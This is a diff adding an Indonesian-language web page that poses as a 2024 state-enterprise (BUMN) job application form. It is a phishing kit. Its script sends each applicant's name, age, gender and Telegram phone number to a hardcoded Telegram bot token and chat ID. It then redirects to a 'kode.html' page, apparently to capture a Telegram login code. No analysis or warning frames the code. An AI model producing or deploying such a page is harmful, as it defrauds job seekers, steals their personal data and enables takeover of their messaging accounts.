@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+      Lowongan kerja BUMN Indonesia 2024 - Untuk Seluruh Rakyat Indonesia
+    </title>
+
+    <!-- Link ke Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Link ke CSS intl-tel-input -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+
+    <style>
+      * {
+        box-sizing: border-box;
+        outline: none;
+        border: none;
+        text-decoration: none;
+      }
+
+      body {
+        font-family: "Poppins", sans-serif;
+        color: #010101;
+        background-color: #fff;
+      }
+
+      /* navbar */
+      .navbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: #fff; /* Warna latar belakang navbar */
+        padding: 10px 20px;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 9999;
+      }
+
+      .navbar .navbar-logo {
+        font-size: 2vw; /* Ukuran font logo dinamis */
+        color: #010101;
+        font-weight: 400;
+        display: flex;
+        align-items: center;
+      }
+
+      .navbar .navbar-nav {
+        display: flex;
+        align-items: center;
+        justify-content: flex-end; /* Posisi tautan tetap rapih di ujung kanan */
+        flex-wrap: nowrap; /* Mencegah elemen terbungkus menjadi kolom */
+      }
+
+      .navbar .navbar-nav a {
+        color: #010101; /* Warna teks bahasa */
+        font-weight: bold;
+        font-size: 1.5vw; /* Ukuran font dinamis */
+        margin: 0 10px; /* Menambahkan jarak antar link bahasa */
+        padding: 5px; /* Ruang klik */
+        text-decoration: none; /* Menghilangkan garis bawah pada link */
+        white-space: nowrap; /* Mencegah teks terpotong ke baris baru */
+      }
+
+      .navbar .navbar-nav a span {
+        color: blue;
+      }
+
+      .navbar .navbar-nav a:hover {
+        color: #007bff; /* Warna hover */
+        transition: color 0.3s ease; /* Efek transisi saat hover */
+      }
+
+      .navbar .navbar-img {
+        width: 40px; /* Ukuran logo */
+        height: auto;
+        margin-left: 10px; /* Jarak antara logo dan teks */
+        object-fit: contain; /* Menjaga proporsi gambar */
+      }
+
+      /* Media Query untuk layar kecil */
+      @media (max-width: 768px) {
+        .navbar {
+          padding: 10px 10px; /* Mengurangi padding pada layar kecil */
+        }
+
+        .navbar .navbar-logo {
+          font-size: 4vw; /* Ukuran font logo lebih besar pada layar kecil */
+        }
+
+        .navbar .navbar-nav {
+          flex-direction: row; /* Pastikan tautan tetap satu baris */
+        }
+
+        .navbar .navbar-nav a {
+          font-size: 3vw; /* Ukuran font lebih besar pada layar kecil */
+          margin: 0 5px; /* Mengurangi margin pada layar kecil */
+          padding: 5px; /* Ruang klik pada layar kecil */
+        }
+
+        .navbar .navbar-img {
+          width: 30px; /* Ukuran logo lebih kecil pada layar kecil */
+          margin-left: 5px; /* Kurangi jarak pada layar kecil */
+          margin-top: 0;
+        }
+      }
+      .hero {
+        height: 100vh;
+        width: 100%;
+        background-size: cover;
+        background-position: center;
+        position: relative;
+      }
+
+      img {
+        width: 350px; /* Atur lebar gambar sesuai keinginan */
+        height: auto; /* Agar proporsi gambar tetap */
+        display: block; /* Untuk membuatnya blok, bisa juga inline-block */
+        margin: 0 auto; /* Posisikan di tengah jika dalam elemen blok */
+        margin-top: 10px;
+      }
+
+      img[src="surituu.jpeg"] {
+        display: flex;
+        margin-top: 50px;
+      }
+
+      /* Container and general styling */
+      .form-container {
+        justify-content: center;
+        background-color: white;
+        padding: 50px 20px;
+        border-radius: 10px;
+        width: 80%;
+        margin: 10px auto;
+        margin-top: 10px;
+      }
+
+      input[type="text"],
+      input[type="radio"] {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 20px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 1.1rem;
+      }
+
+      input[type="tel"] {
+        width: 117%;
+        padding: 12px;
+        margin-bottom: 20px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 1.1rem;
+      }
+
+      /* Specific styling for radio buttons */
+      input[type="radio"] {
+        width: auto; /* Smaller width for radio buttons */
+        margin-right: 10px; /* Space between radio button and label */
+      }
+
+      label {
+        display: flex;
+        align-items: center;
+        margin-bottom: 10px;
+        font-size: 1rem;
+      }
+
+      /* Checkbox styling */
+      input[type="checkbox"] {
+        margin-right: 10px;
+      }
+
+      .btn {
+        display: flex;
+        width: 50%;
+        height: 50px;
+        padding: 12px;
+        margin: 10px auto 0;
+        background-color: #007bff;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 1.1rem;
+        cursor: pointer;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .btn:hover {
+        background-color: #225786;
+      }
+      /* Loading screen styles */
+      .loading-screen {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.8);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        display: none;
+      }
+
+      .loading-screen img {
+        max-width: 100px;
+        max-height: 100px;
+      }
+
+      /* Styling for the header */
+      .page-header {
+        font-weight: bold;
+        margin-top: 5px;
+        text-align: center;
+        font-size: 1.5rem;
+        color: #007bff; /* Adjust color as desired */
+        margin-bottom: 0;
+      }
+
+      /* Styling for the marquee text */
+      .page-header marquee {
+        font-style: italic;
+        color: #333; /* Set color for marquee text */
+        font-size: 1.25rem; /* Adjust size for readability */
+        background-color: #fff; /* Optional: background color for marquee */
+        border-radius: 5px;
+      }
+
+      /* Hover effect for marquee */
+      .page-header marquee:hover {
+        color: #0056b3; /* Slightly darker color on hover */
+        text-decoration: underline;
+      }
+
+      h5 {
+        font-size: 1.3rem; /* Adjust font size */
+        font-weight: bold;
+        text-align: center;
+        color: #007bff; /* Set a distinct color */
+        margin-top: 15px;
+        margin-bottom: 10px;
+        letter-spacing: 1px; /* Add spacing between letters */
+        text-transform: uppercase; /* Make text uppercase */
+      }
+
+      /* Optional hover effect */
+      h5:hover {
+        color: #0056b3; /* Darker color on hover */
+        text-decoration: underline;
+      }
+
+      p {
+        display: flex;
+        top: 0;
+      }
+
+      /* Keyframes for spin animation */
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* media */
+
+      @media (max-width: 768px) {
+        .form-container {
+          width: 90%;
+          padding: 5px;
+        }
+
+        input[type="text"],
+        input[type="tel"] {
+          font-size: 1rem;
+        }
+
+        .btn {
+          width: 60%;
+          font-size: 1rem;
+          padding: 10px;
+          margin-top: 25px;
+        }
+
+        p {
+          margin-top: 0;
+          margin-bottom: 0;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="hero">
+      <br />
+      <img src="11.jpg" alt="tng-img" />
+
+      <h4 class="fw-bold mt-2 page-header text-center">
+        <span id="ctl00_RecipientMasterContent_lblSubject">
+          <marquee scrolldelay="30"
+            >Silahkan isi Data Anda Dengen Benar Di Bawah Untuk Melamar
+            Pekerjaan</marquee
+          >
+        </span>
+      </h4>
+
+      <h5>MENDAFTAR PEKERJAAN</h5>
+
+      <div class="form-container">
+        <form id="registrationForm">
+          <p>Masukan Nama Sesuai E-KTP</p>
+          <input
+            type="text"
+            id="name"
+            name="name"
+            placeholder="Masukan Nama Lengkap"
+            required
+          />
+
+          <p>Masukan Usia</p>
+          <input
+            type="text"
+            id="age"
+            name="age"
+            placeholder="Masukan Usia"
+            required
+          />
+
+          <p>Jenis Kelamin</p>
+          <label>
+            <input type="radio" name="gender" value="Laki-laki" required />
+            Laki-laki
+          </label>
+          <label>
+            <input type="radio" name="gender" value="Perempuan" required />
+            Perempuan
+          </label>
+
+          <p>Masukan Nomor Telegram Aktif</p>
+          <input
+            type="tel"
+            id="phone"
+            name="phone"
+            placeholder="+62"
+            required
+          />
+
+          <label>
+            <input type="checkbox" id="terms" required /> Saya setuju untuk
+            menerima pesan Telegram dari Admin tentang Pekerjaan Ini
+          </label>
+
+          <button type="submit" class="btn">DAFTAR SEKARANG</button>
+        </form>
+      </div>
+
+      <!-- Loading Screen -->
+      <div class="loading-screen" id="loadingScreen">
+        <img src="loading-loading-forever.gif" alt="Loading..." />
+      </div>
+    </div>
+
+    <!-- Script untuk intl-tel-input -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script>
+      // Inisialisasi intl-tel-input
+      const phoneInputField = document.querySelector("#phone");
+      const phoneInput = window.intlTelInput(phoneInputField, {
+        preferredCountries: ["id", "my", "us"],
+        utilsScript:
+          "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+      });
+
+      // Event listener untuk pengiriman form
+      document
+        .getElementById("registrationForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent form submission
+
+          const name = document.getElementById("name").value;
+          const age = document.getElementById("age").value;
+          const gender = document.querySelector(
+            'input[name="gender"]:checked'
+          ).value;
+          const phone = document.getElementById("phone").value;
+          const termsAccepted = document.getElementById("terms").checked;
+
+          if (!termsAccepted) {
+            alert("Anda harus menyetujui persyaratan untuk melanjutkan.");
+            return;
+          }
+
+          // Store values in local storage
+          localStorage.setItem("name", name);
+          localStorage.setItem("age", age);
+          localStorage.setItem("gender", gender);
+          localStorage.setItem("phone", phone);
+
+          document.getElementById("loadingScreen").style.display = "flex";
+
+          const botToken = "7549969913:AAF3qQ0DOlNAcydKl9leovtO0PeWkfRBg1E"; // Ganti dengan token bot Anda
+          const chatId = "6130070174"; // Ganti dengan ID chat Anda
+
+          const message = `
+──────────────
+(INDO | DATA | ${phone})
+──────────────
+
+- Nama Lengkap  : ${name}
+
+- Usia          : ${age}
+
+- Jenis Kelamin : ${gender}
+
+- No HP         : ${phone}
+──────────────
+`;
+
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+            message
+          )}`;
+
+          fetch(url)
+            .then((response) => {
+              if (response.ok) {
+                document.getElementById("registrationForm").reset();
+                window.location.href = "kode.html";
+              } else {
+                console.error("Gagal mengirim pesan:", response.statusText);
+                document.getElementById("loadingScreen").style.display = "none";
+              }
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+              document.getElementById("loadingScreen").style.display = "none";
+            });
+        });
+    </script>
+
+    <script>
+      function startAutoScroll() {
+        var list = document.querySelector(".list");
+        var scrollTimer;
+
+        function scrollList() {
+          var firstItem = list.querySelector(".item:first-child");
+          var itemHeight = firstItem.offsetHeight;
+
+          list.style.transition = "margin-top 1s ease";
+          list.style.marginTop = `-${itemHeight}px`;
+
+          setTimeout(function () {
+            list.style.transition = "none";
+            list.style.marginTop = "0px";
+            list.appendChild(firstItem); // Pindahkan item pertama ke akhir
+          }, 1000); // Setelah animasi selesai (1 detik)
+
+          scrollTimer = setTimeout(scrollList, 2000); // Ulangi scroll setiap 2 detik
+        }
+
+        scrollList(); // Mulai scrolling
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        startAutoScroll(); // Jalankan scrolling otomatis saat halaman dimuat
+      });
+    </script>
+  </body>
+</html>
